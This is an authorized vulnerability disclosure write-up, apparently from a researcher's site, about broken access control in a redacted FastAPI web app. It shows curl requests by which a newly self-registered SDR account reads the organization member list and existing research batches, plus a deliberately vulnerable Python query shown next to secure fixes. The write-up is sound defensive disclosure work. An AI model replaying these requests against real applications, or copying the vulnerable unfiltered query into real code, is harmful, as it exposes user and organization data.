---
title: "Broken Access Control / Improper Resource Isolation"
date: "2026-08-20"
poc_num: "01"
target: "Web application (redacted)"
category: "Broken Access Control"
severity: "Medium"
severity_note: "Tingkat keparahan dinilai oleh peneliti berdasarkan kondisi yang diamati, bukan penilaian vendor."
impact: "Unauthorized visibility of organization members, roles, and existing research batch metadata."
status: "Proven"
---

poc-01 - Broken Access Control / Improper Resource Isolation | Rudi

- 

- 

- 
  
- 

  

  
    01
## Ringkasan

    
A newly registered account with the **SDR** (Sales Development Representative) role can access
      organization information and resources that should not be exposed to a new low-privilege user.

    
The endpoint `GET /api/v1/orgs/me/members` returns the full list of organization
      members and their roles to the new account. Separately, `GET /api/v1/research/discover/batches`
      returns existing research batches to a PoC account that has never performed any discovery activity.

    
Backend fingerprint: FastAPI (Python) + SQLAlchemy + Uvicorn - inferred from the Pydantic error schema.
      The org-switch IDOR (`POST /api/v1/orgs/switch`) returned 403 and is **not** vulnerable (see PoC 4).

  

  
    02
## Status Otorisasi & Ruang Lingkup

    
      Authorization statusAuthorized testing - scope-strict, non-destructive
      Discovery methodPublic registration + authenticated API requests
      Authentication bypassedNO - legitimately registered low-privilege account
      Automated scanningNOT performed - manual requests only
      Testing environmentProduction, read-only (except one PoC account creation)
      Production data accessedNO - PoC/fake identifiers only
      Data modified or destroyedNO
      Target identified hereNO
    
  

  
    03
## Prasyarat

    
      
- New account with the SDR role registered through the public registration endpoint.
      
- JWT obtained directly from the registration response - no email verification or admin approval required.
      
- Testing performed without touching real production data; identifiers were fake/PoC values.
      
- All requests read-only except PoC 1 (new account registration).
    
  

  
    04
## PoC 1 - Self-registration creates an active account + JWT

    
*Objective:* show that public registration creates an active account and returns an auth token with no further verification or approval.

    bash

$ TARGET="https://TARGET"
$ EMAIL="poc_$(date +%s)@example.test"
$ curl -i -X POST "$TARGET/api/v1/auth/register" \
    -H "Content-Type: application/json" \
    -d '{"email":"'"$EMAIL"'","name":"PoC Test","password":"[REDACTED]"}'
HTTP/1.1 200 OK

{ "access_token": "eyJ...", ... }

    
Public registration produces an authenticated session directly. The JWT is issued without email verification or admin approval.

    
*Note:* this is not itself a vulnerability absent a requirement prohibiting self-registration - but it is the precondition for PoC 2 and PoC 3.

    
![PoC login page, account redacted](/images/img-poc/poc01/poc01.jpg)
Figure 1 - login page with the PoC account redacted.
  

  
    05
## PoC 2 - New user can view the member list

    
*Objective:* show that a newly registered SDR account can read the organization member list and roles.

    bash

$ curl -i "$TARGET/api/v1/orgs/me/members" \
    -H "Authorization: Bearer <JWT_NEW_ACCOUNT>"
HTTP/1.1 200 OK

[ { "email": "...", "role": "..." },
  { "email": "...", "role": "owner" } ]

    
A new SDR account with no activity history can view the complete member list and their roles, including accounts
      with the **owner** role. This is unauthorized visibility into organization information.

    
![PoC account dashboard after login](/images/img-poc/poc01/poc02.jpg)
Figure 2 - PoC account dashboard after successful login.
  

  
    06
## PoC 3 - New user can view existing research batches

    
*Objective:* show that a new SDR account with no discovery activity can read research batches already in the system.

    bash

$ curl -i "$TARGET/api/v1/research/discover/batches?limit=10" \
    -H "Authorization: Bearer <JWT_NEW_ACCOUNT>"
{ "batches": [ { "id": ..., "status": "completed",
   "total": 30, "prospects_count": 30,
   "created_at": "2026-08-.." } ] }

    
The new account with no prior discovery activity receives a response containing an existing, completed batch
      (prospects_count: 30) - unauthorized visibility into existing resources.

    
*Note:* not claimed as a cross-tenant IDOR - ownership/tenant boundaries were not definitively established in this test.

  

  
    07
## PoC 4 - Org switching (negative test / not vulnerable)

    
*Objective:* prevent overclaiming by including a negative test for the org-switch IDOR.

    bash

$ curl -i -X POST "$TARGET/api/v1/orgs/switch" \
    -H "Authorization: Bearer <JWT_NEW_ACCOUNT>" \
    -H "Content-Type: application/json" \
    -d '{"organization_id":1}'
HTTP/1.1 403 Forbidden

{"detail": "Not a member of the target organization"}

    
**Conclusion:** org-switch IDOR is NOT vulnerable. The server correctly returns 403 with an appropriate message.

  

  
    08
## Dampak

    Impact
      **A. Member-list disclosure.** A new SDR account can read the full member list and roles, including owner
      accounts - usable for account enumeration, social engineering, or targeted attacks on higher-privilege accounts.

      **B. Unauthorized resource visibility.** A new account with no activity can view existing research batches,
      including status and prospect count - potentially exposing commercial data that should be isolated.
    
    Findings not claimed
      
        
- Credentials exposure - not proven.
        
- Invitation takeover - not proven.
        
- Cross-tenant IDOR - not proven (ownership boundaries not confirmed).
        
- Prospect PII exposure - not proven.
      
    
  

    
    09
## Penilaian Tingkat Keparahan

    
Severity is researcher-assessed based on the observed conditions: the flaw is network-accessible with no complex
      preconditions, but requires a registered low-privilege account. Impact is limited to disclosure of the member list
      and resource metadata, with no evidence of data modification or availability impact.

  

  
    10
## Akar Masalah

    
No adequate authorization check on `/api/v1/orgs/me/members` and
      `/api/v1/research/discover/batches`. Both endpoints validate only that the request carries a
      valid token (**authentication**) but never validate whether the caller is authorized to access the
      returned resource (**authorization**).

  

  
    11
## Solution & Recommendations

    
### before - vulnerable pattern

    python

# VULNERABLE: returns all members without an org filter
def get_org_members(db, current_user):
    return db.query(Member).all()

    
### after - secure pattern

    python

def get_org_members(db, current_user):
    caller_org_id = current_user.organization_id
    membership = db.query(Membership).filter(
        Membership.user_id == current_user.id,
        Membership.org_id  == caller_org_id,
    ).first()
    if not membership:
        raise HTTPException(status_code=403, detail="Forbidden")
    return db.query(Member).filter(
        Member.org_id == caller_org_id
    ).all()

    
### authorization for /orgs/me/members (FastAPI)

    python

@router.get('/orgs/me/members')
def list_org_members(
    db: Session = Depends(get_db),
    current_user: User = Depends(get_current_user),
):
    if not current_user.active_org_id:
        raise HTTPException(status_code=403, detail='No active organization')
    membership = db.query(Membership).filter(
        Membership.user_id == current_user.id,
        Membership.org_id  == current_user.active_org_id,
        Membership.is_active == True,
    ).first()
    if not membership:
        raise HTTPException(status_code=403, detail='Not a member of this organization')
    return db.query(Member).filter(
        Member.org_id == current_user.active_org_id
    ).all()

    
### authorization for /research/discover/batches

    python

@router.get('/research/discover/batches')
def get_batches(
    db: Session = Depends(get_db),
    current_user: User = Depends(get_current_user),
    limit: int = Query(default=10, le=100),
):
    # Option A: strict - only batches owned by the caller
    batches = db.query(Batch).filter(
        Batch.created_by == current_user.id
    ).order_by(Batch.created_at.desc()).limit(limit).all()
    # Option B: org-scoped - if batches are shared within the org
    # batches = db.query(Batch).filter(
    #     Batch.org_id == current_user.active_org_id
    # ).order_by(Batch.created_at.desc()).limit(limit).all()
    return {'batches': batches}

    Least-privilege matrix
    EndpointOwnerManagerSDR
      GET /orgs/me/membersYes (all)Yes (all)Yes (self)
      GET /research/.../batchesYes (all)Yes (team)Yes (self-owned)
      POST /orgs/switchYesNoNo
      GET /orgs/me/prospectsYesYes (team)Yes (assigned only)
    
    
### remediation priority

    #RemediationPriority
      1Authorization filter for /orgs/me/membersHIGH
      2Authorization filter for /research/.../batchesHIGH
      3Implement RBAC permission matrix for SDRHIGH
      4Audit logging for sensitive endpointsMEDIUM
      5Regression / automated security testMEDIUM
      6Review other endpoints with similar patternsMEDIUM
    
  

  
    12
## Conclusion

    
A new SDR account can read information that should not be exposed: the organization member list (PoC 2) and existing
      research batches (PoC 3). Both endpoints perform an authentication check but lack an adequate authorization check. The
      org-switch IDOR was not proven - the endpoint correctly returns 403 - and is excluded as a finding. All testing was
      read-only, with no brute force, no data changes, and no access to production accounts or data.

  

  
    13
## Referensi

    
      
- CWE-284 - Improper Access Control
      
- CWE-285 - Improper Authorization
      
- OWASP A01:2021 - Broken Access Control
    
  

&#8593;
